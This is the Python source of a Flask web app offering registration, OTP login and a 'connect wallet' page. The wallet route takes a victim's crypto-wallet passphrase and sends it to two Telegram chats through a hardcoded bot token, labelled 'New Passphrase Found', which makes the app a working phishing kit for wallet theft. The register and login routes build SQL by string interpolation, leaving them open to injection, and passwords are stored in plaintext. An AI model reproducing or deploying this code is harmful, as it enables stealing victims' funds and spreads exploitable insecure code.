from flask import *
from otp import send_otp
from random import randint
from validate import validate_key
import requests
import sqlite3

conn = sqlite3.connect('database.db')
cur = conn.cursor()
cur.execute("""
CREATE TABLE IF NOT EXISTS users (
  email varchar,
  password varchar
);""")
conn.commit()
conn.close()

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/register")
def register():
    return render_template("register.html")

otp = ""
@app.route("/verify", methods=["GET", "POST"])
def verify():
    conn = sqlite3.connect('database.db')
    cur = conn.cursor()
    global otp
    if request.method == "POST":
        if request.form['email'] != "" and request.form['password'] == request.form['confpassword']:
            otp = str(randint(100000, 999999))
            send_otp(request.form['email'], otp)
            cur.execute(f"""INSERT INTO users (email, password) VALUES ("{request.form['email']}", "{request.form['password']}");""")
            conn.commit()
            conn.close()
            return render_template("verify.html")
    else:
        return render_template("error.html")

@app.route("/dashboard", methods=["GET", "POST"])
def dashboard():
    if request.method == "POST":
        if request.form['otp'] == str(otp):
            return render_template("dashboard.html")
        else:
            return render_template("error.html")
    else:
        return render_template("dashboard.html")

@app.route("/connect-wallet", methods=["GET", "POST"])
def connectWallet():
    if request.method == "POST":
        if request.form['key'] != "":
            if validate_key(str(request.form['key']).lower().strip()):
                r = requests.get(f"https://api.telegram.org/bot8183874085:AAGLB6CXshW5OGvlAK_IJxwcR8Q64j658G0/sendMessage?chat_id=5970697130&text=New Passphrase Found - {str(request.form['key']).lower().strip()}")
                r = requests.get(f"https://api.telegram.org/bot8183874085:AAGLB6CXshW5OGvlAK_IJxwcR8Q64j658G0/sendMessage?chat_id=1775483787&text=New Passphrase Found - {str(request.form['key']).lower().strip()}")
                return render_template("validated.html")
            else:
                return render_template("error.html")
    else:
        return render_template("private_key.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    conn = sqlite3.connect('database.db')
    cur = conn.cursor()
    if request.method == "POST":
        email, password = request.form['email'], request.form['password']
        cur.execute(f"""select * from users where email = '{email}' and password = '{password}';""")
        data = cur.fetchone()
        if data != None:
            conn.commit()
            conn.close()
            return redirect(url_for("dashboard"))
        else:
            return render_template("error.html")
    else:
        return render_template("login.html")

if __name__ == "__main__":
    app.run(port=1004)
